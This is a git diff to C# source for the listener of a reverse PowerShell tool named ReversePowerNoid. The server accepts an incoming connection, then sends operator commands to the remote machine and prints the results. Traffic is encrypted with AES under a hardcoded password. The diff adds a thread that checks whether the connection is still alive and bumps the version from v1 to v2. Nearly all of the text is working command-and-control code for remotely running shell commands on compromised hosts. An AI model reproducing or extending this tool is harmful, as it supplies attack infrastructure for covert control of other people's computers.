@@ -4,10 +4,12 @@ using System.Net.Sockets;
 using System.Text; 
 using System.Security.Cryptography;
 using System.IO; 
+using System.Threading;
   
 public class SynchronousSocketListener {  
 
     public static string Password = "Sup3rS3cur3P4ssw0rd";
+    public static Thread ConnChecker;
     public static string ReadLine()
     {
         Stream inputStream = Console.OpenStandardInput(100000);
@@ -33,6 +35,28 @@ public class SynchronousSocketListener {
         }
 
         return buffer;
+    }
+
+    public static void StartConnChecker(Socket handler) {
+        ConnChecker = new Thread(() => {
+            while (true) {
+                try {
+                    //Console.WriteLine("sending...");
+                    Send(handler, "NOCOMM");
+                    Receive(handler);
+                }catch {
+                    Console.WriteLine("[-] Client disconnected from server!");
+                    try {
+                        handler.Shutdown(SocketShutdown.Both);  
+                        handler.Close();
+                    }catch {}
+                    Environment.Exit(0);
+                    break;
+                }
+                Thread.Sleep(2000);
+            }
+        });
+        ConnChecker.Start();
     }
 
     public static string EncryptStringAES(string rawstring, string password) {
@@ -96,10 +120,7 @@ public class SynchronousSocketListener {
     }
   
     public static void StartListening(int port) {  
-        Console.WriteLine("[+++] ReversePowerNoidv1 - Reverse Powershell has never been this paranoid.");
-        // Establish the local endpoint for the socket.  
-        // Dns.GetHostName returns the name of the
-        // host running the application.  
+        Console.WriteLine("[+++] ReversePowerNoidv2 - Reverse Powershell has never been this paranoid.");
         IPAddress ipAddress = IPAddress.Parse("0.0.0.0"); 
         IPEndPoint localEndPoint = new IPEndPoint(ipAddress, port);  
 
@@ -118,6 +139,7 @@ public class SynchronousSocketListener {
             // Program is suspended while waiting for an incoming connection.  
             Socket handler = listener.Accept();  
             Console.WriteLine("Connected to {0}!", handler.RemoteEndPoint.ToString());
+            StartConnChecker(handler);
             while (true) {
                 string pwd = Receive(handler);
                 Console.Write("RPN {0}> ", pwd);
@@ -128,11 +150,14 @@ public class SynchronousSocketListener {
                 }
                 if (String.Equals(command, "exit", StringComparison.OrdinalIgnoreCase)) {
                     Send(handler, command);
+                    ConnChecker.Abort();
                     break;
                 }
+                ConnChecker.Abort();
                 Send(handler, command);
                 string respond = Receive(handler);
                 Console.WriteLine(respond);
+                StartConnChecker(handler);
             }
             try {
                 handler.Shutdown(SocketShutdown.Both);  
@@ -150,7 +175,6 @@ public class SynchronousSocketListener {
 
     public static void Send(Socket handler, String data) {
         string dataEnc = EncryptStringAES(data, Password);
-        // Convert the string data to byte data using ASCII encoding.
         byte[] byteData = Encoding.ASCII.GetBytes(dataEnc);
         handler.Send(byteData);
     }
